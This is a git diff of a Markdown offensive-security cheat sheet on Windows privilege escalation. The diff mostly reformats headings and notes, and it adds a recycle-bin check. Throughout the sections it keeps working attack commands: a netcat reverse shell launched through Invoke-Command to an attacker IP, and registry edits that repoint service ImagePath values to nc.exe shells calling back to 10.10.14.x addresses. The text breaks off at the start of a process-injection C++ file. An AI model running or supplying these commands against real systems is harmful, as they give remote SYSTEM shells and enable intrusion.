@@ -495,17 +495,18 @@ ps > $cred = new-object -typename System.Management.Automation.PSCredential -arg
 ps > Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
 ps > Invoke-Command -ScriptBlock {\windows\temp\nc.exe -e cmd 10.10.14.13 5555 } -computer localhost
 ```
-##### Abusing Windows ACLs
-Enumerate if some user has full control
+### Abusing Windows ACLs
 ```
+Enumerate if some user has full control:
 get-acl HKLM:\SYSTEM\CurrentControlSet\Services | format-list
 ```
-List all acl services
 ```
+List all acl services:
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *
 ```
-Loop through to find services run as localsystem
 ```
+Loop through to find services run as localsystem:
+
 foreach ($service in $services) { 
   $sddl = (cmd /c sc sdshow $service)[1]; 
   $reg = gp -path hklm:\system\currentcontrolset\services\$service; 
@@ -514,23 +515,31 @@ foreach ($service in $services) {
   }
 }
 ```
-Automatically gets the old value for the service binary. Then it sets that path to nc.exe connecting back to me. It then starts the service, and the puts the original bin path back
 ```
+Automatically gets the old value for the service binary. Then it sets that path to nc.exe connecting back to me. It then starts the service, and the puts the original bin path back:
+
 reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
 copy all the services name onto new file, remove "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\"
 Get-Content "C:\inetpub\wwwroot\uploads\ss.txt" | ForEach-Object {Get-Service $_} 2> $null
 Get-Content "C:\inetpub\wwwroot\uploads\ss.txt" | ForEach-Object {reg.exe add "HKLM\System\CurrentControlSet\services\$_" /t REG_EXPAND_SZ /v ImagePath /d "cmd /c C:\inetpub\wwwroot\uploads\nc.exe -e powershell 10.10.14.30 1233" /f} 2> $null
 Get-Content "C:\inetpub\wwwroot\uploads\sa.txt" | ForEach-Object {start-service $_} 2> $null
 ```
-Mannually change registry service path
 ```
+Mannually change registry service path:
+
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "c:\inetpub\wwwroot\nc64.exe 10.10.14.xx 8887 -e cmd.exe " /f
 ```
-Powershell to list windows registry service runner
 ```
+Powershell to list windows registry service runner:
+
 (gp -path hklm:\system\currentcontrolset\services\DoSvc).ObjectName
 ```
-##### Basic Process Injection
+### Check $RECYCLE.BIN
+```
+cd C:\$RECYCLE.BIN
+dir /AH (display hidden files)
+```
+### Basic Process Injection
 basic.cpp
 ```
 #include <iostream>
